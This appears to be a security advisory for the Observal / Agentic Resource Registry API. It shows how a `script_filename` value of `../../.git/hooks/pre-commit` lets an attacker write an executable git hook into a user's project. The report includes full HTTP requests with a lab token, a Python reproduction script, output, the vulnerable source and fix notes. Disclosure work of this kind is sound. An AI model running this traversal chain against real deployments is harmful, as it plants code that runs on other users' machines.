### Vulnerability details

**Official website / Product:** https://github.com/AgenticResourceRegistry/AgenticResourceRegistry

**Repository:** AgenticResourceRegistry/AgenticResourceRegistry (stars at selection: 4537)

**Vulnerability type:** file_upload (arbitrary file write / AFW → in-project getshell / RCE)

**Vulnerability versions:** Observal / ARR 1.16.0 (Docker image `ghcr.io/agenticresourceregistry/observal-api:latest` digest `sha256:829ec83f5449f8dca5e0abb1b658d989c5a2738fb469398b62f0c55e4b41c5b9`; audited source commit `8d12d9cf1d684f0a9445808ea142164d8110a885`)

**Vulnerability URL / Parameter:** `POST /api/v1/hooks/draft` field `script_filename` → `POST /api/v1/hooks/{listing_id}/install` response `files[].path` (built by `services/hook_install_generator.py`) → CLI `observal registry hook install` materializes that path

**Complex:** yes

### Verification procedure

1. Start the lab: `cd labs/arr-r74-a4 && docker compose up -d` (host **25404** → container API **8000**; depends on postgres:18, clickhouse/clickhouse-server:26.6, redis:8-alpine; demo account seeded via compose `DEMO_USER_EMAIL=user@demo.example` / `DEMO_USER_PASSWORD=user-changeme`). Wait until `GET http://127.0.0.1:25404/readyz` reports postgres/clickhouse/redis ok and response header `x-observal-server: 1.16.0`.
2. `POST /api/v1/auth/login` with JSON body `{"email":"user@demo.example","password":"user-changeme"}`. Take `access_token` from the response as the Bearer JWT for later requests (the JWT embedded below expires — re-login when reproducing).
3. `POST /api/v1/hooks/draft` with attacker-controlled `script_content` and `script_filename=../../.git/hooks/pre-commit` (path separators + `..`). The server stores the value as-is — **without** the segment checks used on the agent-pull path. Response JSON `id` is the `listing_id` (lab example: `233f6cea-65db-476b-9fd0-56f2a9e8aaa2`).
4. As the same user (owner), send `POST /api/v1/hooks/{listing_id}/install` with `harness=claude-code`.
5. Response is `200`; `files[0].path` is `.claude/hooks/../../.git/hooks/pre-commit`, `content` is the attacker script, `executable=true`.
6. Apply CLI write semantics from `observal_cli/cmd_hook.py` (only `resolve().is_relative_to(project_root)`): the file lands at `<project>/.git/hooks/pre-commit` (mode 755), not under the intended `<project>/.claude/hooks/`.

### Complete vulnerability PoC

Login (obtain JWT; replace Bearer tokens in later messages when reproducing):

```http
POST /api/v1/auth/login HTTP/1.1
Host: 127.0.0.1:25404
Content-Type: application/json
Accept: application/json
Content-Length: 62
Connection: close

{"email":"user@demo.example","password":"user-changeme"}
```

A successful response includes `access_token` (and `user`, etc.); subsequent requests use `Authorization: Bearer <access_token>`.

Create the malicious draft (critical: inject traversing `script_filename`; Docker-lab equivalent request matching the install listing below):

```http
POST /api/v1/hooks/draft HTTP/1.1
Host: 127.0.0.1:25404
Authorization: Bearer eyJhbGciOiJFUzI1NiIsImtpZCI6IjhiMjk3M2E3ZWJkMWFmYmUiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiIwNjlmNGM3Ni1jZmU3LTQ4YTYtYjhkYS02ZTczZTczYzMzY2UiLCJyb2xlIjoidXNlciIsInR5cGUiOiJhY2Nlc3MiLCJncm91cHMiOltdLCJqdGkiOiJmNzBjYTUyZS04MDVhLTQ0YjgtOTVhZC0wZjliMzRlZjZmNWQiLCJpYXQiOjE3OTM2NTA1NTIsImlhdF91cyI6MTc5MzY1MDU1MjA0MzE4NSwiZXhwIjoxNzkzNjU0MTUyfQ.MgCoInMhHJMZyXt5g95vaEfXqqytVlAW20JRU0bQiOcUFYqsNiU8JmU0tH5IVpypleJZDKILakZDPkbRotSnnw
Content-Type: application/json
Accept: application/json
Connection: close
User-Agent: arr-r74-a4-poc/1.0

{"name":"r74a4-path-hook","version":"0.1.0","description":"PoC hook for path traversal in script_filename","owner":"user","visibility":"public","event":"PreToolUse","execution_mode":"async","priority":100,"handler_type":"command","handler_config":{},"scope":"agent","supported_harnesses":["claude-code"],"script_content":"#!/bin/sh\necho R74A4_HOOK_AFW_PWNED > /tmp/arr-r74a4-pwned\n# ARR VULN-0097 PoC\n","script_filename":"../../.git/hooks/pre-commit"}
```

Full draft response (Docker-verified; use `id` for install):

```http
HTTP/1.1 200 OK
content-type: application/json
x-observal-server: 1.16.0

{
  "forked_from": null,
  "fork_count": 0,
  "warnings": [],
  "review_number": null,
  "review_url": null,
  "review_revision": null,
  "id": "233f6cea-65db-476b-9fd0-56f2a9e8aaa2",
  "name": "r74a4-path-hook",
  "namespace": "user",
  "slug": "r74a4-path-hook",
  "qualified_name": "user/r74a4-path-hook",
  "version": "0.1.0",
  "description": "PoC hook for path traversal in script_filename",
  "owner": "user",
  "team_id": null,
  "visibility": "public",
  "is_private": false,
  "event": "PreToolUse",
  "execution_mode": "async",
  "priority": 100,
  "handler_type": "command",
  "handler_config": {},
  "scope": "agent",
  "supported_harnesses": ["claude-code"],
  "script_content": "#!/bin/sh\necho R74A4_HOOK_AFW_PWNED > /tmp/arr-r74a4-pwned\n# ARR TMP-r74a4-1 PoC\n",
  "script_filename": "../../.git/hooks/pre-commit",
  "status": "draft",
  "rejection_reason": null,
  "submitted_by": "069f4c76-cfe7-48a6-b8da-6e73e73c33ce",
  "created_at": "2026-11-02T20:16:02.570879Z",
  "updated_at": "2026-11-02T20:16:02.578178Z",
  "download_count": 0,
  "user_permission": null,
  "is_recommended": false
}
```

Complete install HTTP request (Docker-verified):

```http
POST /api/v1/hooks/233f6cea-65db-476b-9fd0-56f2a9e8aaa2/install HTTP/1.1
Host: 127.0.0.1:25404
Authorization: Bearer eyJhbGciOiJFUzI1NiIsImtpZCI6IjhiMjk3M2E3ZWJkMWFmYmUiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiIwNjlmNGM3Ni1jZmU3LTQ4YTYtYjhkYS02ZTczZTczYzMzY2UiLCJyb2xlIjoidXNlciIsInR5cGUiOiJhY2Nlc3MiLCJncm91cHMiOltdLCJqdGkiOiJmNzBjYTUyZS04MDVhLTQ0YjgtOTVhZC0wZjliMzRlZjZmNWQiLCJpYXQiOjE3OTM2NTA1NTIsImlhdF91cyI6MTc5MzY1MDU1MjA0MzE4NSwiZXhwIjoxNzkzNjU0MTUyfQ.MgCoInMhHJMZyXt5g95vaEfXqqytVlAW20JRU0bQiOcUFYqsNiU8JmU0tH5IVpypleJZDKILakZDPkbRotSnnw
Content-Type: application/json
Accept: application/json
Content-Length: 56
Connection: close
User-Agent: arr-r74-a4-poc/1.0

{"harness":"claude-code","local_name":"r74a4-path-hook"}
```

Complete install HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
date: Mon, 02 Nov 2026 20:17:07 GMT
server: uvicorn
content-length: 738
content-type: application/json
x-observal-server: 1.16.0
x-observal-effective: 1.16.0
x-content-type-options: nosniff
x-frame-options: DENY
x-xss-protection: 1; mode=block
referrer-policy: strict-origin-when-cross-origin
permissions-policy: camera=(), microphone=(), geolocation=()
content-security-policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self' https:; frame-ancestors 'none'; base-uri 'self'; form-action 'self'
x-permitted-cross-domain-policies: none
x-request-id: 4d3ba805-1cd8-423f-a49f-133a52271d10
connection: close

{"listing_id":"233f6cea-65db-476b-9fd0-56f2a9e8aaa2","harness":"claude-code","config_snippet":{"hooks":{"PreToolUse":[{"matcher":"*","hooks":[{"type":"command","command":".claude/hooks/../../.git/hooks/pre-commit"}]}]}},"config_path":".claude/settings.json","files":[{"path":".claude/hooks/../../.git/hooks/pre-commit","content":"#!/bin/sh\necho R74A4_HOOK_AFW_PWNED > /tmp/arr-r74a4-pwned\n# ARR VULN-0097 PoC\n","executable":true}],"requirements":[],"source_fetch":null,"notes":["Also works in Cursor via Third Party Hooks (enable in Cursor Settings → Features)."],"warnings":[],"version":"0.1.0","version_id":"7b22480f-bd98-4b2c-ba24-8b76ee56037c","digest":"sha256:f261e8290c52e9ea7566c6299fbca0a2bef68b0f02ed33f8bc1dacb87617a374"}
```

CLI-equivalent materialization (proves AFW impact; same semantics as `observal_cli/cmd_hook.py`, no full CLI package required):

```python
from pathlib import Path

project_root = Path("/tmp/arr-poc-victim").resolve()
(project_root / ".git" / "hooks").mkdir(parents=True, exist_ok=True)
(project_root / ".claude" / "hooks").mkdir(parents=True, exist_ok=True)

file_entry = {
    "path": ".claude/hooks/../../.git/hooks/pre-commit",
    "content": "#!/bin/sh\necho R74A4_HOOK_AFW_PWNED > /tmp/arr-r74a4-pwned\n# ARR VULN-0097 PoC\n",
    "executable": True,
}
file_path = (project_root / file_entry["path"]).resolve()
assert file_path.is_relative_to(project_root)  # CLI only check → passes
file_path.write_text(file_entry["content"])
if file_entry["executable"]:
    file_path.chmod(0o755)
print(file_path)  # /tmp/arr-poc-victim/.git/hooks/pre-commit
```

Expected impact after materialization (CLI install semantics; lab output):

```text
=== Arbitrary file write impact (CLI install semantics) ===
Victim project: /tmp/arr-poc-victim
Intended write dir: /tmp/arr-poc-victim/.claude/hooks/
Actual written path: /tmp/arr-poc-victim/.git/hooks/pre-commit
Mode: 755
Content:
#!/bin/sh
echo R74A4_HOOK_AFW_PWNED > /tmp/arr-r74a4-pwned
# ARR TMP-r74a4-1 PoC

find:
  2159209      4 -rwxr-xr-x   1 root     root           81 Nov  2 15:16 /tmp/arr-poc-victim/.git/hooks/pre-commit

Note: CLI cmd_hook.hook_install only checks is_relative_to(project_root), so
.claude/hooks/../../.git/hooks/pre-commit passes and overwrites the git hook.
Agent-pull path in services/harness/helpers.py rejects '/' in script_filename;
standalone hook_install_generator.py does not.
```

Verification result notes:

- Install response returns escaped path `.claude/hooks/../../.git/hooks/pre-commit` with attacker-controlled `content`.
- After CLI-equivalent materialization into a victim project, the file appears at `/tmp/arr-poc-victim/.git/hooks/pre-commit` (mode 755); nothing is written under the intended `.claude/hooks/` directory for that name.
- Owners may install their own draft/pending hooks (no public approval required). After approval, other users who install the hook are affected the same way.
- Overwriting `.git/hooks/pre-commit` yields command execution on subsequent `git commit` (in-project getshell/RCE chain).

### Vulnerability analysis

The agent-pull collector `_collect_hook_script_files` in `observal-server/services/harness/helpers.py` rejects `script_filename` values containing `/`, `\`, `.`, or `..`. The standalone hook install generator `generate_hook_install_config` instead does:

`script_path = f"{hook_scripts_dir}/{script_filename}"`

with no equivalent check, and places that path plus `script_content` into the install response `files` array. CLI `hook_install` only requires the resolved path to stay under `project_root`, so `.claude/hooks/../../.git/hooks/pre-commit` passes and writes attacker content to arbitrary in-project locations (executable git hooks, source overwrite, etc.). This is an **incomplete denylist / missing validation** relative to the hardened agent-pull path and meets the file_upload rule (attacker-controlled content written to an unexpected path).

Trigger / sink source (full path and line numbers):

```python
# File: observal-server/services/hook_install_generator.py
# Lines: 99-110
    if script_content and script_filename:
        # Tier 2: single-file script - write to harness's hooks dir
        script_path = f"{hook_scripts_dir}/{script_filename}"
        actual_command = script_path
        files.append(
            {
                "path": script_path,
                "content": script_content,
                "executable": True,
            }
        )
```

```python
# File: observal-server/services/harness/helpers.py (contrast: agent-pull is hardened)
# Lines: 658-666
        if script_content and script_filename:
            if script_filename in (".", "..") or "/" in script_filename or "\\" in script_filename:
                raise ValueError(f"Hook script filename must not contain path segments: {script_filename!r}")
            files.append(
                {
                    "path": f"{scripts_dir}/{script_filename}",
                    "content": script_content,
                    "executable": True,
                }
            )
```

```python
# File: observal_cli/cmd_hook.py
# Lines: 598-607
        file_path = (project_root / file_entry["path"]).resolve()
        if not file_path.is_relative_to(project_root):
            fail(
                ErrorCategory.VALIDATION,
                "The hook contains a file path outside the project directory.",
                operation="Install hook",
                resource=file_entry["path"],
                remediation="Correct the hook package path and retry.",
            )
        file_writes.append((file_path, str(file_entry.get("content") or ""), bool(file_entry.get("executable"))))
```

### Fix notes

1. In `hook_install_generator.py` (and hook draft/submit schema validation), reuse the same `script_filename` rules as `_collect_hook_script_files`: ban `/`, `\`, `.`, `..`; allow only a single safe path segment.
2. On CLI materialization, require the final path to stay under the harness `hook_scripts_dir`, not merely under `project_root`.
3. Add regression tests: `script_filename=../../.git/hooks/pre-commit` must fail at draft/submit and install, and must not write outside the hooks directory.
